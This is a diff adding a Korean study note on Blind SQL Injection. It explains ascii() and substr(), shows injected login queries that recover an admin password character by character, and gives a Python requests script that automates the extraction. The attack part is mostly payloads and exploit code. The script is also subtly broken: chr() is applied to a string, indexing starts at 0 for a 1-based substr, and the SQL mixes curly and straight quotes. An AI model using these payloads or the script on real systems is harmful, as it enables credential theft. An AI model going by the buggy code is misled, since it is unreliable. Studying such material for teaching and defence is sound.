@@ -117,6 +117,77 @@
 <br/>
 
 * SQL Injection 응용: ***Blind SQL Injection***
+    | | 설명 |
+    |:---:|------|
+    | 정의 | 참/거짓 반환 결과 또는 정상적인 쿼리문을 보냈을 때와 삽입 공격이 성공했을 때의 차이(시간 차이 등)으로 데이터를 획득하거나 취약성 <br/>여부를 판단하는 공격 기법 |
+    | 사용 배경 | 질의 결과(SQL Injection 공격의 성공 여부)를 공격자가 화면에서 직접 확인하지 못할 때 사용함 |
+    | 특징 | 한 바이트씩 비교해서 공격하는 방법이므로, 다른 공격에 비해 시간이 많이 소요됨 <br/> &nbsp;&nbsp; → **공격을 자동화하는 스크립트**를 작성하여 시간을 단츅시킬 수 있음 <br/> 공격하기 전에 이용자가 입력할 수 있는 모든 문자의 범위를 지정해야 함 |
+    - Background: 공격 시 사용하는 함수
+        | 함수 | 설명 |
+        |:---:|------|
+        | ```ascii(char)``` | 전달된 문자를 아스키 형태로 변환하는 함수 <br/> &nbsp;&nbsp; - ```ascii(a)```의 실행 결과 'a' 문자의 아스키 값인 97이 반환됨 |
+        | ```substr(string, position, length)``` | 문자열에서 지정한 위치(position)부터 길이(length)까지의 값을 가져옴 <br/> &nbsp;&nbsp; - ```substr('ABCD', 2, 2)```의 실행 결과 'BC'가 반환됨 |
+    - Blind SQL Injection 예시: 로그인 기능에서 비밀번호를 획득하는 방법
+        ```sql
+        # 아이디(uid)와 비밀번호(upw)를 입력받고 DBMS의 user_table에 조회하기 위한 쿼리 (가장 간단한 형태)
+        # → {uid}, {upw} 부분에 사용자가 입력한 문자열을 삽입하고 DBMS를 전달해 실행함
+        SELECT uid FROM user_table WHERE uid='{uid}' AND upw='{upw}'
+        ```
+        + 사용자의 입력과 웹 어플리케이션이 작성한 SQL 쿼리를 해석할 때 문자열 구분자로 ```'``` 문자를 사용하고 있음 <br/> &nbsp;&nbsp; ***→ 사용자의 입력에 ```'``` 문자를 입력하여 문자열을 탈출하고 뒷 부분이 SQL 구문으로 해석되게 만듦***
+        + 쿼리 질의를 통해 admin의 upw를 한 자리씩 알아내는 방법
+            ```sql
+            # admin의 upw가 strawberry인 경우
+
+            # 첫 번째 문자(substr(upw, 1, 1)) 구하기
+             SELECT * FROM user_table WHERE uid=‘admin’ AND ascii(substr(upw, 1, 1))=114 --' AND upw=‘’ # False (114 = 'r')
+            SELECT * FROM user_table WHERE uid=‘admin’ AND ascii(substr(upw, 1, 1))=115 --' AND upw=‘’ # True (115 = 's')
+
+            # 두 번째 문자(substr(upw, 2, 1)) 구하기
+            SELECT * FROM user_table WHERE uid=‘admin’ AND ascii(substr(upw, 2, 1))=115 --‘ AND upw=‘’ # False (115 = 's')
+            SELECT * FROM user_table WHERE uid=‘admin’ AND ascii(substr(upw, 2, 1))=116 --' AND upw=‘’ # True (116 = 't')
+            ```
+            | 항목 | 입력 |
+            |:---:|------|
+            | **uid** | ```admin' AND ascii(substr(upw, 시작위치, 1))=아스키코드 --``` <br/> &nbsp;&nbsp; - ```시작위치```: 1에서부터 하나씩 늘려가며 검사함 <br/> &nbsp;&nbsp; - ```아스키 코드```: 비밀번호의 경우 일반적으로 알파벳 대소문자, 숫자, 특수문자 범위로 지정함 <br/> &nbsp;&nbsp; - ```--``` 문자: 해당 문자 뒤에 오는 문장을 주석 처리하여 SQL 쿼리로 실행되지 않도록 만듦 |
+            | **upw** | 아무 문자열이나 입력 가능 (야기서는 아무것도 입력하지 않음) |
+        + 공격 자동화 스크립트 작성 방법
+            ```python
+            #!/usr/bin/python3
+
+            import requests
+            import string
+
+            url = 'https://example.com/login' # 로그인 기능의 URL 입력
+            params = {
+                'uid': '',
+                'upw': ''
+            }
+
+            # 비밀번호가 포함될 수 있는 문자(알파벳, 숫자, 특수문자)를 string 모듈을 사용해 생성함
+            tc = string.ascii_letters + string.digits + string.punctuation
+            # abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
+
+            # uid 입력값에 해당하는 변수 query
+            query = '''
+            admin' and ascii(substr(upw, {idx}, 1)) = {val}--
+            '''
+
+            # password를 저장할 변수
+            password = ''
+
+            # 길이를 먼저 구하고 길이만큼 반복문을 돌릴 수도 있음
+            for idx in range(0, 20): # 한 바이트씩 모든 문자를 비교하는 반복문
+                for ch in tc:
+                    params['uid'] = query.format(idx=idx, val=ord(ch)).strip("\n")
+                    c = requests.get(url, params=params)
+                    print(c.request.url)
+                    if c.text.find("Login success") != -1: # 반환 결과가 참일 경우 페이지에 표시되는 "Login success" 문자열을 찾음
+                        password += chr(ch) # 해당 결과를 반환하는 문자를 password 변수에 추가함
+                        break
+            
+            # 반복문을 마치고 나면 admin 계정의 비밀번호를 획득할 수 있음
+            print(f"Password is {password}")
+            ```
 
 <br/><br/>
 
